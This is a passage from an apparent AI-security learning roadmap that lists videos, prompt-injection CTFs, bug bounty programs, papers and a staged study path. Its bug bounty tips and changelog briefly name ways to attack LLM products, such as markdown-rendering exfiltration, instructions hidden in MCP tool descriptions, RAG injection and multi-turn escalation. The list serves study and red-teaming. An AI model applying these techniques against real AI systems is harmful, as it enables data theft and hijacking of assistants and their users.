| DEF CON AI Village Talks | [YouTube](https://www.youtube.com/@AIVillage) |
| LiveOverflow — AI/ML Security | [YouTube](https://www.youtube.com/@LiveOverflow) |
| 3Blue1Brown — Neural Networks Series | [YouTube](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) |
| John Hammond — AI Security Challenges | [YouTube](https://www.youtube.com/@_JohnHammond) |
| Cybrary — Machine Learning Security | [Cybrary](https://www.cybrary.it/course/machine-learning-security/) |
| How AI Prompt Injection Works — Hands-On (Jan 2026) | [YouTube](https://www.youtube.com/watch?v=fCpAr2OylDw) |
| MCP Prompt Injection: How AI Gets Hacked (Nov 2025) | [YouTube](https://www.youtube.com/watch?v=bO-7DB-3dL8) |
| Prompt Injection in LLM Agents: ReAct, Langchain | [YouTube](https://www.youtube.com/watch?v=43qfHaKh0Xk) |

---

## CTF & Competitions

| Competition | Description | Link |
|---|---|---|
| Crucible | Ongoing AI security challenges | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| HackAPrompt | Annual prompt injection competition | [hackaprompt.com](https://www.hackaprompt.com/) |
| AI Village CTF (DEF CON) | Annual AI security CTF at DEF CON | [aivillage.org](https://aivillage.org/) |
| Gandalf | Self-paced LLM challenge, 8 levels | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| Prompt Airlines | Gamified injection challenges | [promptairlines.com](https://promptairlines.com/) |
| Hack The Box AI Challenges | HTB AI-themed challenges | [hackthebox.com](https://www.hackthebox.com/) |
| Secdim AI Games | Web-based AI security games | [play.secdim.com/game/ai](https://play.secdim.com/game/ai) |
| PromptTrace Gauntlet | 15-level CTF with full context trace, real LLMs | [prompttrace.airedlab.com](https://prompttrace.airedlab.com/) |
| CrowdStrike AI Unlocked | Agent-focused, increasingly capable challenges (Feb 2026) | [crowdstrike.com](https://www.crowdstrike.com/en-us/blog/introducing-ai-unlocked-interactive-prompt-injection-challenge/) |
| ctf-prompt-injection (CharlesTheGreat77) | Dockerized, self-hostable, Ollama + local LLM | [GitHub](https://github.com/CharlesTheGreat77/ctf-prompt-injection) |
| ai-prompt-ctf (c-goosen) | Indirect injection against tool-calling agents (RAG, ReAct, function calling) | [GitHub](https://github.com/c-goosen/ai-prompt-ctf) |
| AI/LLM Exploitation Challenges — 8ksec | Structured AI/ML CTF challenges | [8ksec.io](https://academy.8ksec.io/course/ai-exploitation-challenges) |

---

## Bug Bounty Programs

AI/ML security bug bounties are growing rapidly. Target these platforms:

| Program | Scope | Link |
|---|---|---|
| OpenAI Bug Bounty | ChatGPT, API, plugins | [bugcrowd.com/openai](https://bugcrowd.com/openai) |
| Google AI Bug Bounty | Gemini, Bard, Vertex AI | [bughunters.google.com](https://bughunters.google.com/) |
| Meta AI Bug Bounty | Llama models, Meta AI | [facebook.com/whitehat](https://www.facebook.com/whitehat) |
| HuggingFace via ProtectAI | Hub, models, spaces | [huntr.com](https://huntr.com/) |
| Anthropic Bug Bounty | Claude, API | [anthropic.com/security](https://www.anthropic.com/security) |
| Microsoft (Copilot, Azure AI) | Copilot, Azure OpenAI | [msrc.microsoft.com](https://msrc.microsoft.com/create-report) |
| Huntr (AI/ML focused) | Open source ML libraries | [huntr.com](https://huntr.com/) |

**Tips for AI bug bounty:**
- Focus on **data exfiltration via markdown rendering** (common finding)
- Test **MCP tool poisoning** — embed instructions in tool descriptions
- Test **plugin/tool integrations** thoroughly for SSRF, RCE
- Look for **prompt injection in RAG pipelines**
- Explore **memory and persistent context manipulation**
- Check for **cross-tenant data leakage** in multi-user deployments
- Test **AI IDE rules files** for backdoor injection vectors
- Look for **multi-turn escalation** bypasses in long conversations

---

## Community & News

### Communities

- [AI Village](https://aivillage.org/) — DEF CON's AI security community
- [OWASP AI Exchange](https://owaspai.org/) — Open standard for AI security
- [OWASP Gen AI Security Project](https://genai.owasp.org/) — Standards body maintaining LLM Top 10
- [ProtectAI](https://protectai.com/) — AI security research and tools
- [Embrace the Red — Blog](https://embracethered.com/blog/) — Leading blog on LLM security
- [Kai Greshake's Research](https://kai-greshake.de/) — Indirect prompt injection research
- [r/llmsecurity](https://www.reddit.com/r/llmsecurity/) — Most active LLM security subreddit

### Newsletters & Blogs

- [The Batch — DeepLearning.AI](https://www.deeplearning.ai/the-batch/) — Weekly AI news
- [Simon Willison's Weblog](https://simonwillison.net/) — Authoritative LLM security commentary
- [HiddenLayer Research](https://hiddenlayer.com/research/) — AI security research
- [Lakera Blog](https://www.lakera.ai/blog) — LLM and agentic AI security insights
- [PortSwigger Research](https://portswigger.net/research) — Web + AI security research
- [Adversa AI Blog](https://adversa.ai/blog/) — Real-world AI security incidents and red teaming

---

## Key Academic Papers

| Paper | Year |
|---|---|
| [Explaining and Harnessing Adversarial Examples — Goodfellow et al.](https://arxiv.org/abs/1412.6572) | 2014 |
| [Membership Inference Attacks against ML Models — Shokri et al.](https://arxiv.org/abs/1610.05820) | 2017 |
| [Extracting Training Data from Large Language Models — Carlini et al.](https://arxiv.org/abs/2012.07805) | 2021 |
| [Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection — Greshake et al.](https://arxiv.org/abs/2302.12173) | 2023 |
| [Prompt Injection Attack against LLM-Integrated Applications](https://arxiv.org/abs/2306.05499) | 2023 |
| [Jailbroken: How Does LLM Safety Training Fail? — Wei et al.](https://arxiv.org/abs/2307.02483) | 2023 |
| [Universal and Transferable Adversarial Attacks on Aligned Language Models — Zou et al.](https://arxiv.org/abs/2307.15043) | 2023 |
| [Attention Tracker: Detecting Prompt Injection via Attention Distribution Shifts — NAACL 2025](https://aclanthology.org/2025.findings-naacl.123.pdf) | 2025 |
| [ToolHijacker: Prompt Injection to Tool Selection in LLM Agents](https://arxiv.org/abs/2504.19793) | 2025 |
| [Prompt Injection 2.0: Hybrid AI Threats (XSS + CSRF + AI worms)](https://arxiv.org/abs/2507.13169) | 2025 |
| [Securing AI Agents Against Prompt Injection — 847 test cases, 73.2% → 8.7%](https://arxiv.org/abs/2511.15759) | 2025 |
| [The Attacker Moves Second: Adaptive Attacks Bypass 12 Published Defenses at >90%](https://arxiv.org/abs/2510.09023) | 2025 |
| [The Landscape of Prompt Injection Threats in LLM Agents (SoK + AgentPI benchmark)](https://arxiv.org/abs/2602.10453) | 2026 |
| [Prompt Injection Attacks on Agentic Coding Assistants (SoK, 78 studies)](https://arxiv.org/html/2601.17548v1) | 2026 |
| [Prompt Injection in LLMs and AI Agent Systems — MDPI 2026](https://www.mdpi.com/2078-2489/17/1/54) | 2026 |

---

## Suggested Learning Path by Experience Level

### 🟢 Beginner (0–3 months)

1. Complete [PortSwigger Web Security Academy](https://portswigger.net/web-security) fundamentals
2. Learn Python basics
3. Take [Google ML Crash Course](https://developers.google.com/machine-learning/crash-course)
4. Read [OWASP LLM Top 10 (2025)](https://genai.owasp.org/)
5. Play [Gandalf](https://gandalf.lakera.ai/) — all 8 levels
6. Read [Simon Willison's prompt injection article](https://simonwillison.net/2023/May/2/prompt-injection-explained/)
7. Watch [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g)
8. Read [Prompt Injection Cheat Sheet — Seclify](https://blog.seclify.com/prompt-injection-cheat-sheet/)

### 🟡 Intermediate (3–9 months)

1. Study [MITRE ATLAS Matrix](https://atlas.mitre.org/matrices/ATLAS/) (including 2025 agentic updates)
2. Complete [PortSwigger LLM Attack labs](https://portswigger.net/web-security/llm-attacks)
3. Set up and exploit [Damn Vulnerable LLM Agent](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent)
4. Complete [PromptTrace Gauntlet](https://prompttrace.airedlab.com/) and [Crucible](https://crucible.dreadnode.io/) challenges
5. Read the [LLM Hacker's Handbook](https://github.com/forcesunseen/llm-hackers-handbook)
6. Study [Embrace the Red blog](https://embracethered.com/blog/) in full
7. Experiment with [Garak](https://github.com/leondz/garak) and [PyRIT](https://github.com/Azure/PyRIT)
8. Try [Offensive ML Playbook](https://wiki.offsecml.com/Welcome+to+the+Offensive+ML+Playbook)
9. Watch [MCP Prompt Injection: How AI Gets Hacked](https://www.youtube.com/watch?v=bO-7DB-3dL8)
10. Read [Palo Alto Unit 42 MCP Attack Vectors](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)

### 🔴 Advanced (9+ months)

1. Participate in [AI Village CTF at DEF CON](https://aivillage.org/)
2. Submit findings to [Huntr](https://huntr.com/) or [OpenAI Bug Bounty](https://bugcrowd.com/openai)
3. Study adversarial ML with [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox) and [CleverHans](https://github.com/cleverhans-lab/cleverhans)
4. Read the 2025–2026 academic papers (SoK papers, The Attacker Moves Second, Prompt Injection 2.0)
5. Set up a local MCP environment and test tool poisoning and tool shadowing attacks
6. Contribute to open source tools like [Garak](https://github.com/leondz/garak) or [AI Exploits](https://github.com/protectai/ai-exploits)
7. Test [Augustus](https://www.praetorian.com/blog/introducing-augustus-open-source-llm-prompt-injection/) against your own LLM apps
8. Build your own vulnerable agentic demo environment with MCP integration
9. Write and publish research — blog posts, CVEs, conference talks

---

## What's New in This Edition (vs. 2025)

| Area | What Changed |
|---|---|
| **Phase 4 — Agentic AI & MCP** | Entirely new phase covering the #1 expanding attack surface |
| **MCP Security** | Tool poisoning, tool shadowing, covert invocation, cross-MCP contamination |
| **AI IDE Attacks** | CVE-2025-53773, CVE-2025-54135, IDEsaster, rules file backdoors |
| **Multi-Agent/RAG** | PoisonedRAG, A2A protocol abuse, Log-To-Leak |
| **Papers** | 7 new 2025–2026 papers added (SoK, Attacker Moves Second, Hybrid Threats) |
| **Tools** | Augustus, Spikee, AgentSeal, Sentinel AI, InjecGuard, openclaw-bastion |
| **CTFs** | PromptTrace, CrowdStrike AI Unlocked, ai-prompt-ctf, ctf-prompt-injection |
| **Bug bounty tips** | MCP-specific testing, multi-turn escalation, AI IDE vectors |
| **Attack surface** | Multi-turn attacks (92% success), indirect attacks outpacing direct |

---

*Last updated: March 2026 | Contributions welcome — submit a PR with new resources.*
